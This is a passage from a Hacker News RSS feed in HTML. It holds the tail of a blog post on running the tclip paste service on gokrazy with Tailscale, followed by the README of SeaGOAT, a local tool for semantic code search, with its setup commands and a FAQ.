</span><span>                "</span><span>--data-location=/perm/home/tclip/</span><span>"
</span><span>            ],
</span><span>            "</span><span>WaitForClock</span><span>": </span><span>true</span><span>,
</span><span>            "</span><span>Environment</span><span>": [
</span><span>                "</span><span>TS_AUTHKEY=tskey-auth-hunter2-hunter2hunter2hunter2</span><span>",
</span><span>                "</span><span>USE_FUNNEL=true</span><span>" </span><span>// Remove this if you don't want to use Funnel
</span><span>            ]
</span><span>        },
</span><span>        </span><span>// ...
</span><span>    }
</span><span>}
</span></code></pre>
<p>And then push it with <code>gok update</code>:</p>
<pre><code><span>gok update -i casa
</span></code></pre>
<p>And then you can start using it by heading to <a href="http://paste/">http://paste</a>. Install the command-line tool on your development workstation with <code>go install</code>:</p>
<pre><code><span>go install github.com/tailscale-dev/tclip/cmd/tclip@latest
</span></code></pre>
<p>Here's an example tclip link if you want to see what it looks like in practice: <a href="https://paste.shark-harmonic.ts.net/paste/696b9b02-90ac-4adc-a33d-d749bb6f460f">interjection.c</a>. It's a very simple tool, but it's very useful.</p>
<h2>Conclusion</h2>
<p>gokrazy is insanely cool. It's the <em>easiest</em> way to deploy Go services to your homelab. It integrates seamlessly with Tailscale, and is something that I'm very excited to see grow and mature. I'm very excited to see what the future holds for gokrazy, and I'm very excited to see what people do with it.</p>
<p>I've seen signs that they're going to be adding an automatic update process, and that has me <em>very</em> excited. I'm also excited to see what other services people add to the gokrazy ecosystem. I'm hoping to add a few of my own in the future, and I'm hoping to see what other people do with it.</p>

</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Show HN: SeaGOAT – local, “AI-based” grep for semantic code search (206 pts)]]></title>
            <link>https://github.com/kantord/SeaGOAT</link>
            <guid>37583219</guid>
            <pubDate>Wed, 20 Sep 2023 12:13:09 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://github.com/kantord/SeaGOAT">https://github.com/kantord/SeaGOAT</a>, See on <a href="https://news.ycombinator.com/item?id=37583219">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-target="readme-toc.content">
            <article itemprop="text">
<h2 tabindex="-1" dir="auto">
  <p dir="auto">
    <a target="_blank" rel="noopener noreferrer" href="https://github.com/kantord/SeaGOAT/blob/main/assets/logo-small.png"><img src="https://github.com/kantord/SeaGOAT/raw/main/assets/logo-small.png" alt="Logo" width="200"></a>
    <b>SeaGOAT</b>
  </p>
</h2>
<p dir="auto">A code search engine for the AI age. SeaGOAT is a local search tool that
leverages vector embeddings to enable to search your codebase semantically.</p>
<p dir="auto">
  <a target="_blank" rel="noopener noreferrer" href="https://github.com/kantord/SeaGOAT/blob/main/assets/demo-slideshow.gif"><img src="https://github.com/kantord/SeaGOAT/raw/main/assets/demo-slideshow.gif" alt="" data-animated-image=""></a>
</p>
<p dir="auto"><em>Note: I was recently laid off my job and I am looking for new
opportunities. If you need a Senior Full Stack Developer,
<a href="mailto:github@daniel-kantor.com">contact me</a>! I have experience with
React, Node and Python and I'm located in Spain (European Union).
10+ years in software development professionally.</em></p>
<h2 tabindex="-1" dir="auto">Getting started</h2>
<h3 tabindex="-1" dir="auto">Install SeaGOAT</h3>
<p dir="auto">In order to install SeaGOAT, you need to have the following
dependencies already installed on your computer:</p>
<ul dir="auto">
<li>Python 3.11 or newer</li>
<li>ripgrep</li>
<li><a href="https://github.com/sharkdp/bat">bat</a> (<strong>optional</strong>, highly recommended)</li>
</ul>
<p dir="auto">When <code>bat</code> is <a href="https://github.com/sharkdp/bat#on-ubuntu-using-apt">installed</a>,
it is used to display results as long as color is enabled. When SeaGOAT is
used as part of a pipeline, a grep-line output format is used. When color is
enabled, but <code>bat</code> is not installed, SeaGOAT will highlight the output using
pygments. Using <code>bat</code> is recommended.</p>
<p dir="auto">To install SeaGOAT using <code>pipx</code>, use the following command:</p>

<h3 tabindex="-1" dir="auto">System requirements</h3>
<h4 tabindex="-1" dir="auto">Hardware</h4>
<p dir="auto">Should work on any decent laptop.</p>
<h4 tabindex="-1" dir="auto">Oporating system</h4>
<p dir="auto">SeaGOAT is designed to work on Linux (<em>tested</em> ✅),
macOS (<a href="https://github.com/kantord/SeaGOAT/issues/178" data-hovercard-type="issue" data-hovercard-url="/kantord/SeaGOAT/issues/178/hovercard">partly tested, <strong>help</strong></a> 🙏)
and Windows (<a href="https://github.com/kantord/SeaGOAT/issues/179" data-hovercard-type="issue" data-hovercard-url="/kantord/SeaGOAT/issues/179/hovercard"><strong>help needed</strong></a> 🙏).</p>
<h3 tabindex="-1" dir="auto">Start SeaGOAT server</h3>
<p dir="auto">In order to use SeaGOAT in your project, you have to start the SeaGOAT server
using the following command:</p>
<div dir="auto" data-snippet-clipboard-copy-content="seagoat-server start /path/to/your/repo"><pre>seagoat-server start /path/to/your/repo</pre></div>
<h3 tabindex="-1" dir="auto">Search your repository</h3>
<p dir="auto">If you have the server running, you can simply use the
<code>gt</code> or <code>seagoat</code> command to query your repository. For example:</p>
<div dir="auto" data-snippet-clipboard-copy-content="gt &quot;Where are the numbers rounded&quot;"><pre>gt <span><span>"</span>Where are the numbers rounded<span>"</span></span></pre></div>
<p dir="auto">You can also use
<a href="https://en.wikipedia.org/wiki/Regular_expression" rel="nofollow">Regular Expressions</a>
in your queries, for example</p>
<div dir="auto" data-snippet-clipboard-copy-content="gt &quot;function calc_.* that deals with taxes&quot;"><pre>gt <span><span>"</span>function calc_.* that deals with taxes<span>"</span></span></pre></div>
<h3 tabindex="-1" dir="auto">Stopping the server</h3>
<p dir="auto">You can stop the running server using the following command:</p>
<div dir="auto" data-snippet-clipboard-copy-content="seagoat-server stop /path/to/your/repo"><pre>seagoat-server stop /path/to/your/repo</pre></div>
<h2 tabindex="-1" dir="auto">Development</h2>
<p dir="auto"><strong>Requirements</strong>:</p>
<ul dir="auto">
<li><a href="https://python-poetry.org/" rel="nofollow">Poetry</a></li>
<li>Python 3.11 or newer</li>
<li><a href="https://github.com/BurntSushi/ripgrep">ripgrep</a></li>
</ul>
<h3 tabindex="-1" dir="auto">Install dependencies</h3>
<p dir="auto">After cloning the repository, install dependencies using the following command:</p>

<h3 tabindex="-1" dir="auto">Running tests</h3>
<h4 tabindex="-1" dir="auto">Watch mode (recommended)</h4>

<h4 tabindex="-1" dir="auto">Test changed files</h4>
<div dir="auto" data-snippet-clipboard-copy-content="poetry run pytest .  --testmon"><pre>poetry run pytest <span>.</span>  --testmon</pre></div>
<h4 tabindex="-1" dir="auto">Test all files</h4>

<h3 tabindex="-1" dir="auto">Manual testing</h3>
<p dir="auto">You can test any SeaGOAT command manually in your local development
environment. For example to test the development version of the
<code>seagoat-server</code> command, you can run:</p>
<div dir="auto" data-snippet-clipboard-copy-content="poetry run seagoat-server ~/path/an/example/repository"><pre>poetry run seagoat-server <span>~</span>/path/an/example/repository</pre></div>
<h2 tabindex="-1" dir="auto">FAQ</h2>
<p dir="auto">The points in this FAQ are indications of how SeaGOAT works, but are not
a legal contract. SeaGOAT is licensed under an open source license and if you
are in doubt about the privacy/safety/etc implications of SeaGOAT, you are
welcome to examine the source code,
<a href="https://github.com/kantord/SeaGOAT/issues/new">raise your concerns</a>,
or create a pull request to fix a problem.</p>
<h3 tabindex="-1" dir="auto">How does SeaGOAT work? Does it send my data to ChatGPT?</h3>
<p dir="auto">SeaGOAT does not rely on 3rd party APIs or any remote APIs and executes all
functionality locally using the SeaGOAT server that you are able to run on
your own machine.</p>
<p dir="auto">Instead of relying on APIs or "connecting to ChatGPT", it uses the vector
database called ChromaDB, with a local vector embedding engine and
telemetry disabled by default.</p>
<p dir="auto">Apart from that, SeaGOAT also uses ripgrep, a regular-expression based code
search engine in order to provider regular expression/keyword based matches
in addition to the "AI-based" matches.</p>
<p dir="auto">While the current version of SeaGOAT does not send your data to remote
servers, it might be possible that in the future there will be <strong>optional</strong>
features that do so, if any further improvement can be gained from that.</p>
<h3 tabindex="-1" dir="auto">Why does SeaGOAT need a server?</h3>
<p dir="auto">SeaGOAT needs a server in order to provide a speedy response. SeaGOAT heavily
relies on vector embeddings and vector databases, which at the moment cannot
be replace with an architecture that processes files on the fly.</p>
<p dir="auto">It's worth noting that <em>you are able to run SeaGOAT server entirely locally</em>,
and it works even if you don't have an internet connection. This use case
does not require you to share data with a remote server, you are able to use
your own SeaGOAT server locally, albeit it's also possible to run a SeaGOAT
server and allow other computers to connect to it, if you so wish.</p>
<h3 tabindex="-1" dir="auto">Does SeaGOAT create AI-derived work? Is SeaGOAT ethical?</h3>
<p dir="auto">If you are concerned about the ethical implications of using AI tools keep in
mind that SeaGOAT is not a code generator but a code search engine, therefore
it does not create AI derived work.</p>
<p dir="auto">That being said, a language model <em>is</em> being used to generate vector
embeddings. At the moment SeaGOAT uses ChromaDB's default model for
calculating vector embeddings, and I am not aware of this being an ethical
concern.</p>
<h3 tabindex="-1" dir="auto">What programming langauges are supported?</h3>
<p dir="auto">Currently SeaGOAT is hardcoded to only process files in the following
formats:</p>
<ul dir="auto">
<li><strong>Text Files</strong> (<code>*.txt</code>)</li>
<li><strong>Markdown</strong> (<code>*.md</code>)</li>
<li><strong>Python</strong> (<code>*.py</code>)</li>
<li><strong>C</strong> (<code>*.c</code>, <code>*.h</code>)</li>
<li><strong>C++</strong> (<code>*.cpp</code>, <code>*.cc</code>, <code>*.cxx</code>, <code>*.hpp</code>)</li>
<li><strong>TypeScript</strong> (<code>*.ts</code>, <code>*.tsx</code>)</li>
<li><strong>JavaScript</strong> (<code>*.js</code>, <code>*.jsx</code>)</li>
<li><strong>HTML</strong> (<code>*.html</code>)</li>
<li><strong>Go</strong> (<code>*.go</code>)</li>
<li><strong>Java</strong> (<code>*.java</code>)</li>
<li><strong>PHP</strong> (<code>*.php</code>)</li>
<li><strong>Ruby</strong> (<code>*.rb</code>)</li>
</ul>
</article>
          </div></div>]]></description>
        </item>
    </channel>
</rss>